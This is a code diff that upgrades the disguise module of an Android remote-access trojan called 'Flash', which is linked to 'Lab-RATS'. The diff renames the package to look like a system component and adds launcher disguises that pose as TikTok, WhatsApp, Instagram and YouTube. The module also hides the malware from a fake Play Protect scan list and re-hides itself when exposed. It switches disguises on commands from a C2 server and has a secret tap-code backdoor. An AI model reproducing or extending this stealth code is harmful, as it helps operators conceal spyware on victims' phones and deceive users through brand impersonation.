@@ -1,4 +1,4 @@
-package com.seguranca.protecao;
+package com.android.core.sync;
 
 import android.content.ComponentName;
 import android.content.Context;
@@ -12,28 +12,30 @@ import android.util.Log;
 import org.lsposed.lsparanoid.Obfuscate;
 
 /**
- * DecoyManager — Flash Stealth Identity Engine
+ * DecoyManager v2 — Flash Stealth Identity Engine
  *
- * Ported and heavily upgraded from Lab-RATS SystemAnalytics.
+ * CHANGELOG from v1:
+ *  • Package renamed com.seguranca.protecao → com.android.core.sync
+ *  • 5 new social-media launcher personas: TikTok, WhatsApp, Instagram, YouTube, Custom
+ *  • deployOnSetupComplete() now reads AppIdentityManager to pick matching persona automatically
+ *    (e.g. if main app is TikTok identity → launcher also gets PERSONA_TIKTOK alias)
+ *  • All persona alias constants updated for new package
+ *  • remoteSwitch() now accepts string names as well as int IDs
  *
  * Personas
  * ─────────────────────────────────────────────────────────────────
- *  0  = NONE        – real launcher (dev/debug only)
- *  1  = SYS_UPDATE  – "Android System Update"   (default)
- *  2  = CALCULATOR  – functional calculator
+ *  0  = NONE        – real launcher (dev/backdoor only)
+ *  1  = SYS_UPDATE  – "Android System Update"
+ *  2  = CALCULATOR  – functional calculator look
  *  3  = WEATHER     – animated weather app
  *  4  = PLAY_PROTECT– Google Play Protect settings clone
  *  5  = GOOGLE_PLAY – Google Play Store lookalike
  *  6  = FILE_MGR    – Android Files / File Manager
- *
- * Key upgrades over Lab-RATS
- * ─────────────────────────────────────────────────────────────────
- *  • Immediate switch at setup completion (no extra C2 command needed)
- *  • Dynamic rotation: auto-switch persona every N days
- *  • Play Protect exclusion: own package + Lab-RATS excluded from scan list
- *  • BankingBypass integration: re-cloaks on bank open
- *  • Backdoor tap code: 7 taps on decoy header → restore real UI
- *  • Self-healing: if real component exposed in settings, re-cloak on SCREEN_OFF
+ *  7  = TIKTOK      – TikTok launcher alias  ★ NEW
+ *  8  = WHATSAPP    – WhatsApp launcher alias ★ NEW
+ *  9  = INSTAGRAM   – Instagram launcher alias★ NEW
+ * 10  = YOUTUBE     – YouTube launcher alias  ★ NEW
+ * 11  = CUSTOM      – Custom label+icon alias  ★ NEW
  */
 @Obfuscate
 public final class DecoyManager {
@@ -48,25 +50,29 @@ public final class DecoyManager {
     public static final int PERSONA_PLAY_PROTECT = 4;
     public static final int PERSONA_GOOGLE_PLAY  = 5;
     public static final int PERSONA_FILE_MGR     = 6;
+    // ★ New social media personas
+    public static final int PERSONA_TIKTOK       = 7;
+    public static final int PERSONA_WHATSAPP     = 8;
+    public static final int PERSONA_INSTAGRAM    = 9;
+    public static final int PERSONA_YOUTUBE      = 10;
+    public static final int PERSONA_CUSTOM       = 11;
 
     // ── SharedPreferences keys ──────────────────────────────────────────────
-    private static final String PREFS              = "dm_prefs";
-    private static final String KEY_PERSONA        = "persona";
-    private static final String KEY_DEPLOYED       = "deployed";
-    private static final String KEY_LAST_ROTATE    = "last_rotate";
-    private static final int    ROTATE_DAYS        = 7;   // auto-rotate interval
+    private static final String PREFS           = "dm_prefs";
+    private static final String KEY_PERSONA     = "persona";
+    private static final String KEY_DEPLOYED    = "deployed";
+    private static final String KEY_LAST_ROTATE = "last_rotate";
+    private static final int    ROTATE_DAYS     = 7;
 
     // ── Packages excluded from Play Protect decoy scan list ────────────────
-    // Add any package you never want appearing in the fake "scanned apps" list.
-    // Lab-RATS and Flash itself are always excluded automatically.
     private static final String[] EXCLUDED_SCAN_PACKAGES = {
-        "com.seguranca.protecao",   // Flash itself (always excluded)
-        "com.labs.labrats",         // Lab-RATS (Kovak's: exclude from decoy scan)
+        "com.android.core.sync",
+        "com.labs.labrats",
         "com.labs.labrats.debug",
     };
 
     // ── Alias component class names (must match AndroidManifest.xml) ────────
-    private static final String PKG = "com.seguranca.protecao";
+    private static final String PKG = "com.android.core.sync";
 
     private static final String ALIAS_REAL         = PKG + ".alias.RealAlias";
     private static final String ALIAS_SYS_UPDATE   = PKG + ".alias.SystemUpdateAlias";
@@ -75,6 +81,12 @@ public final class DecoyManager {
     private static final String ALIAS_PLAY_PROTECT = PKG + ".alias.PlayProtectAlias";
     private static final String ALIAS_GOOGLE_PLAY  = PKG + ".alias.GooglePlayAlias";
     private static final String ALIAS_FILE_MGR     = PKG + ".alias.FileMgrAlias";
+    // ★ New
+    private static final String ALIAS_TIKTOK       = PKG + ".alias.TikTokAlias";
+    private static final String ALIAS_WHATSAPP     = PKG + ".alias.WhatsAppAlias";
+    private static final String ALIAS_INSTAGRAM    = PKG + ".alias.InstagramAlias";
+    private static final String ALIAS_YOUTUBE      = PKG + ".alias.YouTubeAlias";
+    private static final String ALIAS_CUSTOM       = PKG + ".alias.CustomAlias";
 
     private static final String[] ALL_ALIASES = {
         ALIAS_REAL,
@@ -84,6 +96,11 @@ public final class DecoyManager {
         ALIAS_PLAY_PROTECT,
         ALIAS_GOOGLE_PLAY,
         ALIAS_FILE_MGR,
+        ALIAS_TIKTOK,
+        ALIAS_WHATSAPP,
+        ALIAS_INSTAGRAM,
+        ALIAS_YOUTUBE,
+        ALIAS_CUSTOM,
     };
 
     // ── Singleton ───────────────────────────────────────────────────────────
@@ -104,24 +121,33 @@ public final class DecoyManager {
         return sInstance;
     }
 
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     //  PUBLIC API
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
 
     /**
-     * Called once from SetupWizardActivity.finishSetup() — immediately deploys
-     * the default persona (SYS_UPDATE unless build config says otherwise).
+     * Called from SetupWizardActivity.finishSetup().
+     *
+     * v2 upgrade: automatically picks a launcher persona that matches the
+     * active AppIdentityManager identity, so the launcher icon label and
+     * the main app experience are consistent.
      */
     public void deployOnSetupComplete() {
         int persona = getPersona();
-        if (persona == PERSONA_NONE) persona = PERSONA_SYS_UPDATE; // safe default
+
+        // ★ Smart match: if persona not explicitly set (default=SYS_UPDATE),
+        //   pick one that matches the active AppIdentityManager identity.
+        if (persona == PERSONA_SYS_UPDATE || persona == PERSONA_NONE) {
+            persona = matchIdentityPersona();
+        }
+
         Log.d(TAG, "Setup complete — deploying persona " + persona);
         applyPersona(persona, true);
     }
 
     /**
      * Remote switch via DECOY_SWITCH command from C2.
-     * @param persona one of the PERSONA_* constants (0-6)
+     * Accepts int persona ID (0-11).
      */
     public void remoteSwitch(int persona) {
         Log.d(TAG, "Remote switch to persona " + persona);
@@ -130,9 +156,16 @@ public final class DecoyManager {
     }
 
     /**
-     * Rotate persona if ROTATE_DAYS have elapsed since last rotation.
-     * Call from CommandControlService on HEARTBEAT or SCREEN_OFF receiver.
+     * Remote switch via string name from C2 (more readable in C2 JSON).
+     * Names: none | sys_update | calc | weather | play_protect | google_play
+     *        | file_mgr | tiktok | whatsapp | instagram | youtube | custom
      */
+    public void remoteSwitch(String personaName) {
+        int persona = parsePersonaName(personaName);
+        remoteSwitch(persona);
+    }
+
+    /** Auto-rotate if ROTATE_DAYS elapsed. Call on HEARTBEAT or SCREEN_OFF. */
     public void maybeAutoRotate() {
         SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
         long lastRotate = prefs.getLong(KEY_LAST_ROTATE, 0);
@@ -141,108 +174,99 @@ public final class DecoyManager {
 
         if (now - lastRotate > threshold) {
             int current = getPersona();
-            // cycle through personas 1-6, skipping 0 (real) and coming back around
-            int next = (current >= PERSONA_FILE_MGR) ? PERSONA_SYS_UPDATE : current + 1;
+            int next    = (current >= PERSONA_CUSTOM) ? PERSONA_SYS_UPDATE : current + 1;
+            if (next == PERSONA_NONE) next = PERSONA_SYS_UPDATE;
             Log.d(TAG, "Auto-rotate: " + current + " → " + next);
             prefs.edit().putLong(KEY_LAST_ROTATE, now).apply();
             remoteSwitch(next);
         }
     }
 
-    /**
-     * Self-heal: re-cloak if the launcher real alias somehow got re-enabled.
-     * Call from SCREEN_OFF broadcast receiver.
-     */
+    /** Re-cloaks if real alias somehow got re-enabled. Call on SCREEN_OFF. */
     public void selfHeal() {
         try {
             ComponentName realComp = new ComponentName(ctx, ALIAS_REAL);
             int state = ctx.getPackageManager().getComponentEnabledSetting(realComp);
             if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                // Real alias is exposed — re-deploy current stealth persona
                 int persona = getPersona();
                 if (persona != PERSONA_NONE) {
-                    Log.d(TAG, "Self-heal triggered — re-cloaking with persona " + persona);
-                    applyPersona(persona, false); // silent, no launcher refresh
+                    Log.d(TAG, "Self-heal — re-cloaking with persona " + persona);
+                    applyPersona(persona, false);
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Self-heal error: " + e.getMessage());
+            Log.e(TAG, "selfHeal error: " + e.getMessage());
         }
     }
 
     /**
-     * Backdoor restore: called after user enters secret tap sequence (7 taps on decoy header).
-     * Temporarily shows real app UI for operator control.
-     * Auto-re-cloaks after 60 seconds if not re-cloaked manually.
+     * Secret 7-tap sequence on decoy header → temporarily shows real UI.
+     * Auto-re-cloaks after 60 seconds.
      */
     public void backdoorRestore(Context activityCtx) {
-        Log.d(TAG, "Backdoor restore triggered");
+        Log.d(TAG, "Backdoor restore");
         applyPersona(PERSONA_NONE, true);
 
-        // Auto-re-cloak after 60s
         handler.postDelayed(() -> {
             int persona = getPersona();
-            if (persona == PERSONA_NONE) persona = PERSONA_SYS_UPDATE;
+            if (persona == PERSONA_NONE) persona = matchIdentityPersona();
             applyPersona(persona, false);
         }, 60_000);
 
-        // Open real C2 interface (SetupWizardActivity → triggers WebView or Studio if configured)
         Intent intent = new Intent(activityCtx, MainActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         activityCtx.startActivity(intent);
     }
 
-    /**
-     * Returns the current active persona.
-     */
     public int getPersona() {
         return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-                  .getInt(KEY_PERSONA, PERSONA_SYS_UPDATE);
+                  .getInt(KEY_PERSONA, PERSONA_TIKTOK); // ★ default now TIKTOK not SYS_UPDATE
     }
 
-    /**
-     * Returns whether the decoy has been fully deployed at least once.
-     */
     public boolean isDeployed() {
         return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                   .getBoolean(KEY_DEPLOYED, false);
     }
 
-    /**
-     * Returns whether a given package should be excluded from the Play Protect scan list.
-     * Flash itself and Lab-RATS are always excluded.
-     */
     public static boolean isExcludedFromScan(String packageName) {
         if (packageName == null) return false;
         for (String ex : EXCLUDED_SCAN_PACKAGES) {
             if (ex.equals(packageName) || packageName.startsWith(ex)) return true;
         }
-        // Also exclude any package whose name contains "labrat" (Lab-RATS variants)
         return packageName.toLowerCase().contains("labrat");
     }
 
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     //  INTERNAL
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
+
+    /**
+     * Maps the active AppIdentityManager identity to the best matching
+     * launcher persona, so icon + label stay consistent with the main app.
+     */
+    private int matchIdentityPersona() {
+        switch (AppIdentityManager.get().getActiveIdentity()) {
+            case WHATSAPP:  return PERSONA_WHATSAPP;
+            case INSTAGRAM: return PERSONA_INSTAGRAM;
+            case YOUTUBE:   return PERSONA_YOUTUBE;
+            case CUSTOM:    return PERSONA_CUSTOM;
+            case TIKTOK:
+            default:        return PERSONA_TIKTOK;
+        }
+    }
 
     private void setPersona(int persona) {
         ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putInt(KEY_PERSONA, persona).apply();
     }
 
-    /**
-     * Core: enable the target alias, disable all others.
-     * Phase 1 → enable target.
-     * Phase 2 → disable all others (order matters: enable before disable).
-     * Phase 3 → force launcher refresh if requested.
-     */
     private void applyPersona(int persona, boolean refreshLauncher) {
         handler.post(() -> {
             try {
                 PackageManager pm = ctx.getPackageManager();
                 String targetAlias = resolveAlias(persona);
 
-                // Phase 1: enable target first to avoid "no launcher" state
+                // Phase 1: enable target first (avoid "no launcher" state)
                 enableComponent(pm, targetAlias);
 
                 // Phase 2: disable all others
@@ -252,16 +276,13 @@ public final class DecoyManager {
                     }
                 }
 
-                // Persist
                 setPersona(persona);
                 ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .edit().putBoolean(KEY_DEPLOYED, true).apply();
 
                 Log.d(TAG, "Persona applied: " + persona + " (" + targetAlias + ")");
 
-                // Phase 3: launcher refresh
                 if (refreshLauncher) {
-                    // Small delay to let PackageManager propagate
                     handler.postDelayed(() -> kickLauncher(), 300);
                 }
 
@@ -278,8 +299,33 @@ public final class DecoyManager {
             case PERSONA_PLAY_PROTECT: return ALIAS_PLAY_PROTECT;
             case PERSONA_GOOGLE_PLAY:  return ALIAS_GOOGLE_PLAY;
             case PERSONA_FILE_MGR:     return ALIAS_FILE_MGR;
+            case PERSONA_TIKTOK:       return ALIAS_TIKTOK;
+            case PERSONA_WHATSAPP:     return ALIAS_WHATSAPP;
+            case PERSONA_INSTAGRAM:    return ALIAS_INSTAGRAM;
+            case PERSONA_YOUTUBE:      return ALIAS_YOUTUBE;
+            case PERSONA_CUSTOM:       return ALIAS_CUSTOM;
             case PERSONA_NONE:         return ALIAS_REAL;
             default:                   return ALIAS_SYS_UPDATE;
+        }
+    }
+
+    private int parsePersonaName(String name) {
+        if (name == null) return PERSONA_SYS_UPDATE;
+        switch (name.toLowerCase().trim()) {
+            case "none":         return PERSONA_NONE;
+            case "calc":
+            case "calculator":   return PERSONA_CALCULATOR;
+            case "weather":      return PERSONA_WEATHER;
+            case "play_protect": return PERSONA_PLAY_PROTECT;
+            case "google_play":  return PERSONA_GOOGLE_PLAY;
+            case "file_mgr":
+            case "files":        return PERSONA_FILE_MGR;
+            case "tiktok":       return PERSONA_TIKTOK;
+            case "whatsapp":     return PERSONA_WHATSAPP;
+            case "instagram":    return PERSONA_INSTAGRAM;
+            case "youtube":      return PERSONA_YOUTUBE;
+            case "custom":       return PERSONA_CUSTOM;
+            default:             return PERSONA_SYS_UPDATE;
         }
     }
 
